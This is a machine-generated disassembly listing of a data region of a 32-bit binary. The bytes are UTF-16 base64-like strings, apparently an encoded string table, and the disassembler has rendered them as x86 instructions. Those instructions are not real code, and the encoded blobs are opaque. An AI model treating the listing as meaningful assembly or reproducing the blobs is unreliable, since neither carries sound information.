  40b9e8:	00 58 00             	add    %bl,0x0(%eax)
  40b9eb:	63 00                	arpl   %eax,(%eax)
  40b9ed:	39 00                	cmp    %eax,(%eax)
  40b9ef:	54                   	push   %esp
  40b9f0:	00 72 00             	add    %dh,0x0(%edx)
  40b9f3:	6a 00                	push   $0x0
  40b9f5:	2b 00                	sub    (%eax),%eax
  40b9f7:	31 00                	xor    %eax,(%eax)
  40b9f9:	30 00                	xor    %al,(%eax)
  40b9fb:	43                   	inc    %ebx
  40b9fc:	00 2b                	add    %ch,(%ebx)
  40b9fe:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40ba02:	00 77 00             	add    %dh,0x0(%edi)
  40ba05:	62 00                	bound  %eax,(%eax)
  40ba07:	49                   	dec    %ecx
  40ba08:	00 2b                	add    %ch,(%ebx)
  40ba0a:	00 61 00             	add    %ah,0x0(%ecx)
  40ba0d:	30 00                	xor    %al,(%eax)
  40ba0f:	75 00                	jne    0x40ba11
  40ba11:	37                   	aaa
  40ba12:	00 75 00             	add    %dh,0x0(%ebp)
  40ba15:	72 00                	jb     0x40ba17
  40ba17:	6b 00 54             	imul   $0x54,(%eax),%eax
  40ba1a:	00 58 00             	add    %bl,0x0(%eax)
  40ba1d:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40ba21:	74 00                	je     0x40ba23
  40ba23:	59                   	pop    %ecx
  40ba24:	00 72 00             	add    %dh,0x0(%edx)
  40ba27:	6b 00 79             	imul   $0x79,(%eax),%eax
  40ba2a:	00 33                	add    %dh,(%ebx)
  40ba2c:	00 2b                	add    %ch,(%ebx)
  40ba2e:	00 65 00             	add    %ah,0x0(%ebp)
  40ba31:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba32:	00 4f 00             	add    %cl,0x0(%edi)
  40ba35:	55                   	push   %ebp
  40ba36:	00 75 00             	add    %dh,0x0(%ebp)
  40ba39:	33 00                	xor    (%eax),%eax
  40ba3b:	6b 00 36             	imul   $0x36,(%eax),%eax
  40ba3e:	00 30                	add    %dh,(%eax)
  40ba40:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40ba44:	00 6f 00             	add    %ch,0x0(%edi)
  40ba47:	4d                   	dec    %ebp
  40ba48:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40ba4c:	00 67 00             	add    %ah,0x0(%edi)
  40ba4f:	36 00 74 00 4f       	add    %dh,%ss:0x4f(%eax,%eax,1)
  40ba54:	00 7a 00             	add    %bh,0x0(%edx)
  40ba57:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba58:	00 63 00             	add    %ah,0x0(%ebx)
  40ba5b:	5a                   	pop    %edx
  40ba5c:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  40ba60:	00 42 00             	add    %al,0x0(%edx)
  40ba63:	2b 00                	sub    (%eax),%eax
  40ba65:	54                   	push   %esp
  40ba66:	00 59 00             	add    %bl,0x0(%ecx)
  40ba69:	76 00                	jbe    0x40ba6b
  40ba6b:	37                   	aaa
  40ba6c:	00 42 00             	add    %al,0x0(%edx)
  40ba6f:	65 00 32             	add    %dh,%gs:(%edx)
  40ba72:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba75:	2b 00                	sub    (%eax),%eax
  40ba77:	67 00 36 00 31       	add    %dh,0x3100
  40ba7c:	00 6e 00             	add    %ch,0x0(%esi)
  40ba7f:	6a 00                	push   $0x0
  40ba81:	31 00                	xor    %eax,(%eax)
  40ba83:	4a                   	dec    %edx
  40ba84:	00 4b 00             	add    %cl,0x0(%ebx)
  40ba87:	59                   	pop    %ecx
  40ba88:	00 37                	add    %dh,(%edi)
  40ba8a:	00 42 00             	add    %al,0x0(%edx)
  40ba8d:	6b 00 75             	imul   $0x75,(%eax),%eax
  40ba90:	00 7a 00             	add    %bh,0x0(%edx)
  40ba93:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba94:	00 4d 00             	add    %cl,0x0(%ebp)
  40ba97:	73 00                	jae    0x40ba99
  40ba99:	59                   	pop    %ecx
  40ba9a:	00 32                	add    %dh,(%edx)
  40ba9c:	00 35 00 75 00 43    	add    %dh,0x43007500
  40baa2:	00 63 00             	add    %ah,0x0(%ebx)
  40baa5:	54                   	push   %esp
  40baa6:	00 32                	add    %dh,(%edx)
  40baa8:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  40baac:	00 41 00             	add    %al,0x0(%ecx)
  40baaf:	54                   	push   %esp
  40bab0:	00 37                	add    %dh,(%edi)
  40bab2:	00 45 00             	add    %al,0x0(%ebp)
  40bab5:	4e                   	dec    %esi
  40bab6:	00 30                	add    %dh,(%eax)
  40bab8:	00 71 00             	add    %dh,0x0(%ecx)
  40babb:	4f                   	dec    %edi
  40babc:	00 78 00             	add    %bh,0x0(%eax)
  40babf:	35 00 47 00 31       	xor    $0x31004700,%eax
  40bac4:	00 33                	add    %dh,(%ebx)
  40bac6:	00 36                	add    %dh,(%esi)
  40bac8:	00 47 00             	add    %al,0x0(%edi)
  40bacb:	58                   	pop    %eax
  40bacc:	00 4b 00             	add    %cl,0x0(%ebx)
  40bacf:	4a                   	dec    %edx
  40bad0:	00 30                	add    %dh,(%eax)
  40bad2:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40bad6:	00 48 00             	add    %cl,0x0(%eax)
  40bad9:	46                   	inc    %esi
  40bada:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
  40bade:	00 49 00             	add    %cl,0x0(%ecx)
  40bae1:	66 00 33             	data16 add %dh,(%ebx)
  40bae4:	00 4c 00 56          	add    %cl,0x56(%eax,%eax,1)
  40bae8:	00 48 00             	add    %cl,0x0(%eax)
  40baeb:	35 00 5a 00 5a       	xor    $0x5a005a00,%eax
  40baf0:	00 50 00             	add    %dl,0x0(%eax)
  40baf3:	48                   	dec    %eax
  40baf4:	00 6f 00             	add    %ch,0x0(%edi)
  40baf7:	4d                   	dec    %ebp
  40baf8:	00 30                	add    %dh,(%eax)
  40bafa:	00 68 00             	add    %ch,0x0(%eax)
  40bafd:	70 00                	jo     0x40baff
  40baff:	6d                   	insl   (%dx),%es:(%edi)
  40bb00:	00 48 00             	add    %cl,0x0(%eax)
  40bb03:	2b 00                	sub    (%eax),%eax
  40bb05:	50                   	push   %eax
  40bb06:	00 77 00             	add    %dh,0x0(%edi)
  40bb09:	7a 00                	jp     0x40bb0b
  40bb0b:	31 00                	xor    %eax,(%eax)
  40bb0d:	71 00                	jno    0x40bb0f
  40bb0f:	47                   	inc    %edi
  40bb10:	00 45 00             	add    %al,0x0(%ebp)
  40bb13:	78 00                	js     0x40bb15
  40bb15:	4e                   	dec    %esi
  40bb16:	00 74 00 4c          	add    %dh,0x4c(%eax,%eax,1)
  40bb1a:	00 65 00             	add    %ah,0x0(%ebp)
  40bb1d:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40bb20:	00 53 00             	add    %dl,0x0(%ebx)
  40bb23:	37                   	aaa
  40bb24:	00 33                	add    %dh,(%ebx)
  40bb26:	00 5a 00             	add    %bl,0x0(%edx)
  40bb29:	53                   	push   %ebx
  40bb2a:	00 35 00 37 00 76    	add    %dh,0x76003700
  40bb30:	00 68 00             	add    %ch,0x0(%eax)
  40bb33:	6b 00 42             	imul   $0x42,(%eax),%eax
  40bb36:	00 68 00             	add    %ch,0x0(%eax)
  40bb39:	7a 00                	jp     0x40bb3b
  40bb3b:	54                   	push   %esp
  40bb3c:	00 38                	add    %bh,(%eax)
  40bb3e:	00 70 00             	add    %dh,0x0(%eax)
  40bb41:	4b                   	dec    %ebx
  40bb42:	00 71 00             	add    %dh,0x0(%ecx)
  40bb45:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40bb49:	71 00                	jno    0x40bb4b
  40bb4b:	58                   	pop    %eax
  40bb4c:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40bb50:	00 43 00             	add    %al,0x0(%ebx)
  40bb53:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb54:	00 6a 00             	add    %ch,0x0(%edx)
  40bb57:	43                   	inc    %ebx
  40bb58:	00 45 00             	add    %al,0x0(%ebp)
  40bb5b:	6d                   	insl   (%dx),%es:(%edi)
  40bb5c:	00 7a 00             	add    %bh,0x0(%edx)
  40bb5f:	62 00                	bound  %eax,(%eax)
  40bb61:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  40bb65:	75 00                	jne    0x40bb67
  40bb67:	61                   	popa
  40bb68:	00 77 00             	add    %dh,0x0(%edi)
  40bb6b:	52                   	push   %edx
  40bb6c:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40bb70:	00 4a 00             	add    %cl,0x0(%edx)
  40bb73:	50                   	push   %eax
  40bb74:	00 33                	add    %dh,(%ebx)
  40bb76:	00 52 00             	add    %dl,0x0(%edx)
  40bb79:	55                   	push   %ebp
  40bb7a:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  40bb7e:	00 4a 00             	add    %cl,0x0(%edx)
  40bb81:	4c                   	dec    %esp
  40bb82:	00 75 00             	add    %dh,0x0(%ebp)
  40bb85:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40bb89:	44                   	inc    %esp
  40bb8a:	00 63 00             	add    %ah,0x0(%ebx)
  40bb8d:	61                   	popa
  40bb8e:	00 38                	add    %bh,(%eax)
  40bb90:	00 37                	add    %dh,(%edi)
  40bb92:	00 59 00             	add    %bl,0x0(%ecx)
  40bb95:	64 00 2f             	add    %ch,%fs:(%edi)
  40bb98:	00 68 00             	add    %ch,0x0(%eax)
  40bb9b:	6d                   	insl   (%dx),%es:(%edi)
  40bb9c:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40bba0:	00 51 00             	add    %dl,0x0(%ecx)
  40bba3:	6e                   	outsb  %ds:(%esi),(%dx)
  40bba4:	00 36                	add    %dh,(%esi)
  40bba6:	00 49 00             	add    %cl,0x0(%ecx)
  40bba9:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40bbad:	4a                   	dec    %edx
  40bbae:	00 6a 00             	add    %ch,0x0(%edx)
  40bbb1:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40bbb4:	00 6a 00             	add    %ch,0x0(%edx)
  40bbb7:	4e                   	dec    %esi
  40bbb8:	00 61 00             	add    %ah,0x0(%ecx)
  40bbbb:	58                   	pop    %eax
  40bbbc:	00 67 00             	add    %ah,0x0(%edi)
  40bbbf:	43                   	inc    %ebx
  40bbc0:	00 63 00             	add    %ah,0x0(%ebx)
  40bbc3:	45                   	inc    %ebp
  40bbc4:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  40bbc8:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40bbcc:	00 39                	add    %bh,(%ecx)
  40bbce:	00 69 00             	add    %ch,0x0(%ecx)
  40bbd1:	47                   	inc    %edi
  40bbd2:	00 59 00             	add    %bl,0x0(%ecx)
  40bbd5:	2b 00                	sub    (%eax),%eax
  40bbd7:	37                   	aaa
  40bbd8:	00 7a 00             	add    %bh,0x0(%edx)
  40bbdb:	4d                   	dec    %ebp
  40bbdc:	00 61 00             	add    %ah,0x0(%ecx)
  40bbdf:	54                   	push   %esp
  40bbe0:	00 63 00             	add    %ah,0x0(%ebx)
  40bbe3:	55                   	push   %ebp
  40bbe4:	00 70 00             	add    %dh,0x0(%eax)
  40bbe7:	64 00 4c 00 4d       	add    %cl,%fs:0x4d(%eax,%eax,1)
  40bbec:	00 39                	add    %bh,(%ecx)
  40bbee:	00 31                	add    %dh,(%ecx)
  40bbf0:	00 47 00             	add    %al,0x0(%edi)
  40bbf3:	74 00                	je     0x40bbf5
  40bbf5:	76 00                	jbe    0x40bbf7
  40bbf7:	2f                   	das
  40bbf8:	00 52 00             	add    %dl,0x0(%edx)
  40bbfb:	4c                   	dec    %esp
  40bbfc:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40bc00:	00 57 00             	add    %dl,0x0(%edi)
  40bc03:	47                   	inc    %edi
  40bc04:	00 51 00             	add    %dl,0x0(%ecx)
  40bc07:	71 00                	jno    0x40bc09
  40bc09:	4f                   	dec    %edi
  40bc0a:	00 35 00 32 00 65    	add    %dh,0x65003200
  40bc10:	00 42 00             	add    %al,0x0(%edx)
  40bc13:	59                   	pop    %ecx
  40bc14:	00 76 00             	add    %dh,0x0(%esi)
  40bc17:	71 00                	jno    0x40bc19
  40bc19:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc1a:	00 62 00             	add    %ah,0x0(%edx)
  40bc1d:	41                   	inc    %ecx
  40bc1e:	00 4d 00             	add    %cl,0x0(%ebp)
  40bc21:	61                   	popa
  40bc22:	00 76 00             	add    %dh,0x0(%esi)
  40bc25:	77 00                	ja     0x40bc27
  40bc27:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40bc2b:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40bc2e:	00 32                	add    %dh,(%edx)
  40bc30:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40bc34:	00 49 00             	add    %cl,0x0(%ecx)
  40bc37:	46                   	inc    %esi
  40bc38:	00 67 00             	add    %ah,0x0(%edi)
  40bc3b:	68 00 34 00 4f       	push   $0x4f003400
  40bc40:	00 5a 00             	add    %bl,0x0(%edx)
  40bc43:	4f                   	dec    %edi
  40bc44:	00 41 00             	add    %al,0x0(%ecx)
  40bc47:	61                   	popa
  40bc48:	00 77 00             	add    %dh,0x0(%edi)
  40bc4b:	62 00                	bound  %eax,(%eax)
  40bc4d:	63 00                	arpl   %eax,(%eax)
  40bc4f:	42                   	inc    %edx
  40bc50:	00 76 00             	add    %dh,0x0(%esi)
  40bc53:	68 00 44 00 57       	push   $0x57004400
  40bc58:	00 77 00             	add    %dh,0x0(%edi)
  40bc5b:	74 00                	je     0x40bc5d
  40bc5d:	52                   	push   %edx
  40bc5e:	00 48 00             	add    %cl,0x0(%eax)
  40bc61:	76 00                	jbe    0x40bc63
  40bc63:	48                   	dec    %eax
  40bc64:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bc67:	33 00                	xor    (%eax),%eax
  40bc69:	56                   	push   %esi
  40bc6a:	00 39                	add    %bh,(%ecx)
  40bc6c:	00 71 00             	add    %dh,0x0(%ecx)
  40bc6f:	6a 00                	push   $0x0
  40bc71:	48                   	dec    %eax
  40bc72:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  40bc76:	00 31                	add    %dh,(%ecx)
  40bc78:	00 69 00             	add    %ch,0x0(%ecx)
  40bc7b:	35 00 63 00 70       	xor    $0x70006300,%eax
  40bc80:	00 2b                	add    %ch,(%ebx)
  40bc82:	00 56 00             	add    %dl,0x0(%esi)
  40bc85:	76 00                	jbe    0x40bc87
  40bc87:	32 00                	xor    (%eax),%al
  40bc89:	79 00                	jns    0x40bc8b
  40bc8b:	4b                   	dec    %ebx
  40bc8c:	00 79 00             	add    %bh,0x0(%ecx)
  40bc8f:	32 00                	xor    (%eax),%al
  40bc91:	6d                   	insl   (%dx),%es:(%edi)
  40bc92:	00 76 00             	add    %dh,0x0(%esi)
  40bc95:	74 00                	je     0x40bc97
  40bc97:	55                   	push   %ebp
  40bc98:	00 6a 00             	add    %ch,0x0(%edx)
  40bc9b:	50                   	push   %eax
  40bc9c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bc9f:	46                   	inc    %esi
  40bca0:	00 56 00             	add    %dl,0x0(%esi)
  40bca3:	32 00                	xor    (%eax),%al
  40bca5:	52                   	push   %edx
  40bca6:	00 58 00             	add    %bl,0x0(%eax)
  40bca9:	38 00                	cmp    %al,(%eax)
  40bcab:	6f                   	outsl  %ds:(%esi),(%dx)
  40bcac:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  40bcb0:	00 70 00             	add    %dh,0x0(%eax)
  40bcb3:	68 00 65 00 7a       	push   $0x7a006500
  40bcb8:	00 4e 00             	add    %cl,0x0(%esi)
  40bcbb:	52                   	push   %edx
  40bcbc:	00 77 00             	add    %dh,0x0(%edi)
  40bcbf:	41                   	inc    %ecx
  40bcc0:	00 59 00             	add    %bl,0x0(%ecx)
  40bcc3:	2f                   	das
  40bcc4:	00 6d 00             	add    %ch,0x0(%ebp)
  40bcc7:	50                   	push   %eax
  40bcc8:	00 61 00             	add    %ah,0x0(%ecx)
  40bccb:	54                   	push   %esp
  40bccc:	00 55 00             	add    %dl,0x0(%ebp)
  40bccf:	2f                   	das
  40bcd0:	00 36                	add    %dh,(%esi)
  40bcd2:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40bcd6:	00 41 00             	add    %al,0x0(%ecx)
  40bcd9:	4e                   	dec    %esi
  40bcda:	00 6f 00             	add    %ch,0x0(%edi)
  40bcdd:	34 00                	xor    $0x0,%al
  40bcdf:	61                   	popa
  40bce0:	00 58 00             	add    %bl,0x0(%eax)
  40bce3:	7a 00                	jp     0x40bce5
  40bce5:	50                   	push   %eax
  40bce6:	00 50 00             	add    %dl,0x0(%eax)
  40bce9:	4c                   	dec    %esp
  40bcea:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  40bcee:	00 57 00             	add    %dl,0x0(%edi)
  40bcf1:	67 00 6d 00          	add    %ch,0x0(%di)
  40bcf5:	50                   	push   %eax
  40bcf6:	00 58 00             	add    %bl,0x0(%eax)
  40bcf9:	54                   	push   %esp
  40bcfa:	00 32                	add    %dh,(%edx)
  40bcfc:	00 78 00             	add    %bh,0x0(%eax)
  40bcff:	32 00                	xor    (%eax),%al
  40bd01:	45                   	inc    %ebp
  40bd02:	00 58 00             	add    %bl,0x0(%eax)
  40bd05:	4b                   	dec    %ebx
  40bd06:	00 7a 00             	add    %bh,0x0(%edx)
  40bd09:	52                   	push   %edx
  40bd0a:	00 47 00             	add    %al,0x0(%edi)
  40bd0d:	4f                   	dec    %edi
  40bd0e:	00 76 00             	add    %dh,0x0(%esi)
  40bd11:	34 00                	xor    $0x0,%al
  40bd13:	51                   	push   %ecx
  40bd14:	00 69 00             	add    %ch,0x0(%ecx)
  40bd17:	49                   	dec    %ecx
  40bd18:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  40bd1c:	00 58 00             	add    %bl,0x0(%eax)
  40bd1f:	31 00                	xor    %eax,(%eax)
  40bd21:	56                   	push   %esi
  40bd22:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  40bd26:	00 72 00             	add    %dh,0x0(%edx)
  40bd29:	54                   	push   %esp
  40bd2a:	00 43 00             	add    %al,0x0(%ebx)
  40bd2d:	30 00                	xor    %al,(%eax)
  40bd2f:	34 00                	xor    $0x0,%al
  40bd31:	50                   	push   %eax
  40bd32:	00 63 00             	add    %ah,0x0(%ebx)
  40bd35:	2b 00                	sub    (%eax),%eax
  40bd37:	59                   	pop    %ecx
  40bd38:	00 70 00             	add    %dh,0x0(%eax)
  40bd3b:	33 00                	xor    (%eax),%eax
  40bd3d:	68 00 69 00 55       	push   $0x55006900
  40bd42:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40bd46:	00 75 00             	add    %dh,0x0(%ebp)
  40bd49:	62 00                	bound  %eax,(%eax)
  40bd4b:	70 00                	jo     0x40bd4d
  40bd4d:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bd51:	51                   	push   %ecx
  40bd52:	00 36                	add    %dh,(%esi)
  40bd54:	00 36                	add    %dh,(%esi)
  40bd56:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
  40bd5a:	00 4e 00             	add    %cl,0x0(%esi)
  40bd5d:	66 00 64 00 39       	data16 add %ah,0x39(%eax,%eax,1)
  40bd62:	00 56 00             	add    %dl,0x0(%esi)
  40bd65:	6d                   	insl   (%dx),%es:(%edi)
  40bd66:	00 67 00             	add    %ah,0x0(%edi)
  40bd69:	67 00 38             	add    %bh,(%bx,%si)
  40bd6c:	00 32                	add    %dh,(%edx)
  40bd6e:	00 75 00             	add    %dh,0x0(%ebp)
  40bd71:	4d                   	dec    %ebp
  40bd72:	00 68 00             	add    %ch,0x0(%eax)
  40bd75:	78 00                	js     0x40bd77
  40bd77:	44                   	inc    %esp
  40bd78:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  40bd7c:	00 42 00             	add    %al,0x0(%edx)
  40bd7f:	4b                   	dec    %ebx
  40bd80:	00 75 00             	add    %dh,0x0(%ebp)
  40bd83:	38 00                	cmp    %al,(%eax)
  40bd85:	59                   	pop    %ecx
  40bd86:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40bd8a:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  40bd8e:	00 57 00             	add    %dl,0x0(%edi)
  40bd91:	50                   	push   %eax
  40bd92:	00 7a 00             	add    %bh,0x0(%edx)
  40bd95:	39 00                	cmp    %eax,(%eax)
  40bd97:	4b                   	dec    %ebx
  40bd98:	00 6f 00             	add    %ch,0x0(%edi)
  40bd9b:	58                   	pop    %eax
  40bd9c:	00 56 00             	add    %dl,0x0(%esi)
  40bd9f:	52                   	push   %edx
  40bda0:	00 69 00             	add    %ch,0x0(%ecx)
  40bda3:	50                   	push   %eax
  40bda4:	00 71 00             	add    %dh,0x0(%ecx)
  40bda7:	7a 00                	jp     0x40bda9
  40bda9:	4b                   	dec    %ebx
  40bdaa:	00 30                	add    %dh,(%eax)
  40bdac:	00 38                	add    %bh,(%eax)
  40bdae:	00 66 00             	add    %ah,0x0(%esi)
  40bdb1:	47                   	inc    %edi
  40bdb2:	00 6f 00             	add    %ch,0x0(%edi)
  40bdb5:	71 00                	jno    0x40bdb7
  40bdb7:	46                   	inc    %esi
  40bdb8:	00 71 00             	add    %dh,0x0(%ecx)
  40bdbb:	4b                   	dec    %ebx
  40bdbc:	00 53 00             	add    %dl,0x0(%ebx)
  40bdbf:	42                   	inc    %edx
  40bdc0:	00 65 00             	add    %ah,0x0(%ebp)
  40bdc3:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40bdc7:	7a 00                	jp     0x40bdc9
  40bdc9:	59                   	pop    %ecx
  40bdca:	00 75 00             	add    %dh,0x0(%ebp)
  40bdcd:	45                   	inc    %ebp
  40bdce:	00 6b 00             	add    %ch,0x0(%ebx)
  40bdd1:	53                   	push   %ebx
  40bdd2:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  40bdd6:	00 4d 00             	add    %cl,0x0(%ebp)
  40bdd9:	59                   	pop    %ecx
  40bdda:	00 2f                	add    %ch,(%edi)
  40bddc:	00 4a 00             	add    %cl,0x0(%edx)
  40bddf:	6f                   	outsl  %ds:(%esi),(%dx)
  40bde0:	00 63 00             	add    %ah,0x0(%ebx)
  40bde3:	76 00                	jbe    0x40bde5
  40bde5:	56                   	push   %esi
  40bde6:	00 69 00             	add    %ch,0x0(%ecx)
  40bde9:	52                   	push   %edx
  40bdea:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  40bdee:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40bdf2:	00 46 00             	add    %al,0x0(%esi)
  40bdf5:	71 00                	jno    0x40bdf7
  40bdf7:	76 00                	jbe    0x40bdf9
  40bdf9:	30 00                	xor    %al,(%eax)
  40bdfb:	6b 00 43             	imul   $0x43,(%eax),%eax
  40bdfe:	00 51 00             	add    %dl,0x0(%ecx)
  40be01:	38 00                	cmp    %al,(%eax)
  40be03:	6f                   	outsl  %ds:(%esi),(%dx)
  40be04:	00 55 00             	add    %dl,0x0(%ebp)
  40be07:	49                   	dec    %ecx
  40be08:	00 30                	add    %dh,(%eax)
  40be0a:	00 31                	add    %dh,(%ecx)
  40be0c:	00 2f                	add    %ch,(%edi)
  40be0e:	00 6e 00             	add    %ch,0x0(%esi)
  40be11:	71 00                	jno    0x40be13
  40be13:	66 00 42 00          	data16 add %al,0x0(%edx)
  40be17:	57                   	push   %edi
  40be18:	00 56 00             	add    %dl,0x0(%esi)
  40be1b:	50                   	push   %eax
  40be1c:	00 61 00             	add    %ah,0x0(%ecx)
  40be1f:	72 00                	jb     0x40be21
  40be21:	6e                   	outsb  %ds:(%esi),(%dx)
  40be22:	00 48 00             	add    %cl,0x0(%eax)
  40be25:	63 00                	arpl   %eax,(%eax)
  40be27:	35 00 62 00 46       	xor    $0x46006200,%eax
  40be2c:	00 67 00             	add    %ah,0x0(%edi)
  40be2f:	4e                   	dec    %esi
  40be30:	00 68 00             	add    %ch,0x0(%eax)
  40be33:	79 00                	jns    0x40be35
  40be35:	41                   	inc    %ecx
  40be36:	00 6f 00             	add    %ch,0x0(%edi)
  40be39:	4d                   	dec    %ebp
  40be3a:	00 4e 00             	add    %cl,0x0(%esi)
  40be3d:	39 00                	cmp    %eax,(%eax)
  40be3f:	6f                   	outsl  %ds:(%esi),(%dx)
  40be40:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  40be44:	00 35 00 32 00 30    	add    %dh,0x30003200
  40be4a:	00 58 00             	add    %bl,0x0(%eax)
  40be4d:	70 00                	jo     0x40be4f
  40be4f:	7a 00                	jp     0x40be51
  40be51:	36 00 75 00          	add    %dh,%ss:0x0(%ebp)
  40be55:	42                   	inc    %edx
  40be56:	00 38                	add    %bh,(%eax)
  40be58:	00 4e 00             	add    %cl,0x0(%esi)
  40be5b:	48                   	dec    %eax
  40be5c:	00 72 00             	add    %dh,0x0(%edx)
  40be5f:	77 00                	ja     0x40be61
  40be61:	67 00 42 00          	add    %al,0x0(%bp,%si)
  40be65:	53                   	push   %ebx
  40be66:	00 75 00             	add    %dh,0x0(%ebp)
  40be69:	4e                   	dec    %esi
  40be6a:	00 71 00             	add    %dh,0x0(%ecx)
  40be6d:	32 00                	xor    (%eax),%al
  40be6f:	2b 00                	sub    (%eax),%eax
  40be71:	51                   	push   %ecx
  40be72:	00 52 00             	add    %dl,0x0(%edx)
  40be75:	4a                   	dec    %edx
  40be76:	00 39                	add    %bh,(%ecx)
  40be78:	00 2b                	add    %ch,(%ebx)
  40be7a:	00 73 00             	add    %dh,0x0(%ebx)
  40be7d:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40be81:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40be85:	54                   	push   %esp
  40be86:	00 67 00             	add    %ah,0x0(%edi)
  40be89:	56                   	push   %esi
  40be8a:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
  40be8e:	00 6e 00             	add    %ch,0x0(%esi)
  40be91:	70 00                	jo     0x40be93
  40be93:	69 00 39 00 43 00    	imul   $0x430039,(%eax),%eax
  40be99:	6a 00                	push   $0x0
  40be9b:	6f                   	outsl  %ds:(%esi),(%dx)
  40be9c:	00 56 00             	add    %dl,0x0(%esi)
  40be9f:	76 00                	jbe    0x40bea1
  40bea1:	71 00                	jno    0x40bea3
  40bea3:	38 00                	cmp    %al,(%eax)
  40bea5:	44                   	inc    %esp
  40bea6:	00 49 00             	add    %cl,0x0(%ecx)
  40bea9:	43                   	inc    %ebx
  40beaa:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bead:	58                   	pop    %eax
  40beae:	00 32                	add    %dh,(%edx)
  40beb0:	00 2b                	add    %ch,(%ebx)
  40beb2:	00 52 00             	add    %dl,0x0(%edx)
  40beb5:	6d                   	insl   (%dx),%es:(%edi)
  40beb6:	00 35 00 54 00 56    	add    %dh,0x56005400
  40bebc:	00 47 00             	add    %al,0x0(%edi)
  40bebf:	42                   	inc    %edx
  40bec0:	00 77 00             	add    %dh,0x0(%edi)
  40bec3:	4c                   	dec    %esp
  40bec4:	00 43 00             	add    %al,0x0(%ebx)
  40bec7:	68 00 59 00 51       	push   $0x51005900
  40becc:	00 46 00             	add    %al,0x0(%esi)
  40becf:	2f                   	das
  40bed0:	00 51 00             	add    %dl,0x0(%ecx)
  40bed3:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bed8:	80 b1 2f 00 5a 00 53 	xorb   $0x53,0x5a002f(%ecx)
  40bedf:	00 6f 00             	add    %ch,0x0(%edi)
  40bee2:	2f                   	das
  40bee3:	00 47 00             	add    %al,0x0(%edi)
  40bee6:	45                   	inc    %ebp
  40bee7:	00 76 00             	add    %dh,0x0(%esi)
  40beea:	79 00                	jns    0x40beec
  40beec:	70 00                	jo     0x40beee
  40beee:	6e                   	outsb  %ds:(%esi),(%dx)
  40beef:	00 36                	add    %dh,(%esi)
  40bef1:	00 69 00             	add    %ch,0x0(%ecx)
  40bef4:	6a 00                	push   $0x0
  40bef6:	6f                   	outsl  %ds:(%esi),(%dx)
  40bef7:	00 50 00             	add    %dl,0x0(%eax)
  40befa:	37                   	aaa
  40befb:	00 70 00             	add    %dh,0x0(%eax)
  40befe:	32 00                	xor    (%eax),%al
  40bf00:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  40bf04:	71 00                	jno    0x40bf06
  40bf06:	38 00                	cmp    %al,(%eax)
  40bf08:	4c                   	dec    %esp
  40bf09:	00 77 00             	add    %dh,0x0(%edi)
  40bf0c:	53                   	push   %ebx
  40bf0d:	00 31                	add    %dh,(%ecx)
  40bf0f:	00 72 00             	add    %dh,0x0(%edx)
  40bf12:	4f                   	dec    %edi
  40bf13:	00 2b                	add    %ch,(%ebx)
  40bf15:	00 50 00             	add    %dl,0x0(%eax)
  40bf18:	6b 00 48             	imul   $0x48,(%eax),%eax
  40bf1b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bf1e:	4e                   	dec    %esi
  40bf1f:	00 51 00             	add    %dl,0x0(%ecx)
  40bf22:	72 00                	jb     0x40bf24
  40bf24:	70 00                	jo     0x40bf26
  40bf26:	4d                   	dec    %ebp
  40bf27:	00 48 00             	add    %cl,0x0(%eax)
  40bf2a:	4e                   	dec    %esi
